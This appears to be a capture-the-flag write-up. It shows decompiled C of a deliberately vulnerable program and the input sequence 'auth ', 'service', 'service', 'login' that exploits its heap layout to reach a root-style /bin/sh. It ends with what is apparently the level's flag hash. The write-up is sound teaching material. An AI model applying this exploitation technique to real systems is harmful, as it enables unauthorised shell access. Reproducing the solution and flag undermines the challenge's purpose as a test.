```c
int main(void)
{
	char cVar1;
	char *pcVar2;
	int iVar3;
	uint uVar4;
	char *pbVar5;
	char *pbVar6;
	bool bVar7;
	int check_service_dup;
	int uVar9;
	bool bVar10;
	int uVar11;
	char bVar12;
	char local_90[5];
	char local_8b[2];
	char service_dup[125];

	bVar12 = 0;
	do
	{
		printf("%p, %p \n", auth, service);
		pcVar2 = fgets((char *)local_90, 0x80, stdin);
		bVar7 = false;
		bVar10 = pcVar2 == (char *)0x0;
		if (bVar10)
		{
			return 0;
		}
		iVar3 = 5;
		pbVar5 = local_90;
		pbVar6 = (char *)"auth ";
		do
		{
			if (iVar3 == 0)
				break;
			iVar3 = iVar3 + -1;
			bVar7 = *pbVar5 < *pbVar6;
			bVar10 = *pbVar5 == *pbVar6;
			pbVar5 = pbVar5 + (uint)bVar12 * -2 + 1;
			pbVar6 = pbVar6 + (uint)bVar12 * -2 + 1;
		} while (bVar10);
		check_service_dup = 0;
		uVar11 = (!bVar7 && !bVar10) == bVar7;
		if ((bool)uVar11)
		{
			auth = (int *)malloc(4);
			*auth = 0;
			uVar4 = 0xffffffff;
			pcVar2 = local_8b;
			do
			{
				if (uVar4 == 0)
					break;
				uVar4 = uVar4 - 1;
				cVar1 = *pcVar2;
				pcVar2 = pcVar2 + (uint)bVar12 * -2 + 1;
			} while (cVar1 != '\0');
			uVar4 = ~uVar4 - 1;
			check_service_dup = uVar4 < 0x1e;
			uVar11 = uVar4 == 0x1e;
			if (uVar4 < 0x1f)
			{
				strcpy((char *)auth, local_8b);
			}
		}
		iVar3 = 5;
		pbVar5 = local_90;
		pbVar6 = (char *)"reset";
		do
		{
			printf("reset while\n");
			if (iVar3 == 0)
				break;
			iVar3 = iVar3 + -1;
			check_service_dup = *pbVar5 < *pbVar6;
			uVar11 = *pbVar5 == *pbVar6;
			pbVar5 = pbVar5 + (uint)bVar12 * -2 + 1;
			pbVar6 = pbVar6 + (uint)bVar12 * -2 + 1;
		} while ((bool)uVar11);
		uVar9 = 0;
		check_service_dup = (!(bool)check_service_dup && !(bool)uVar11) == (bool)check_service_dup;
		if ((bool)check_service_dup)
		{
			free(auth);
		}
		iVar3 = 6;
		pbVar5 = local_90;
		pbVar6 = (char *)"service";
		do
		{
			printf("service while\n");
			if (iVar3 == 0)
				break;
			iVar3 = iVar3 + -1;
			uVar9 = *pbVar5 < *pbVar6;
			check_service_dup = *pbVar5 == *pbVar6;
			pbVar5 = pbVar5 + (uint)bVar12 * -2 + 1;
			pbVar6 = pbVar6 + (uint)bVar12 * -2 + 1;
		} while ((bool)check_service_dup);
		uVar11 = 0;
		check_service_dup = (!(bool)uVar9 && !(bool)check_service_dup) == (bool)uVar9;
		if ((bool)check_service_dup)
		{
			uVar11 = (char *)0xfffffff8 < local_90;
			check_service_dup = service_dup == (char *)0x0;
			service = strdup(service_dup);
		}
		iVar3 = 5;
		pbVar5 = local_90;
		pbVar6 = (char *)"login";
		do
		{
			printf("login while\n");
			if (iVar3 == 0)
				break;
			iVar3 = iVar3 + -1;
			uVar11 = *pbVar5 < *pbVar6;
			check_service_dup = *pbVar5 == *pbVar6;
			pbVar5 = pbVar5 + (uint)bVar12 * -2 + 1;
			pbVar6 = pbVar6 + (uint)bVar12 * -2 + 1;
		} while ((bool)check_service_dup);
		if ((!(bool)uVar11 && !(bool)check_service_dup) == (bool)uVar11)
		{
			if (auth[8] == 0)
			{
				fwrite("Password:\n", 1, 10, stdout);
			}
			else
			{
				system("/bin/sh");
			}
		}
	} while (true);
}
```

To access the `/bin/sh`, we just have to make sure the last character of `auth` is not empty when we run login.

To do so, we run `auth` to initialize the variable, then service twice to fill auth, and finally login to execute `/bin/sh`

We have to do:

```
auth 
service
service
login
```

Don't forget the space after the first `auth`

The first address needs to 32 more the second one.
Each time we write service, the second address gets incremented by 16.

```
gdb> disass main
0x08048625 <+193>: cmp eax,0x1e
```
So the second address is 31, then we need to run service twice to be >= 32

`c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a`
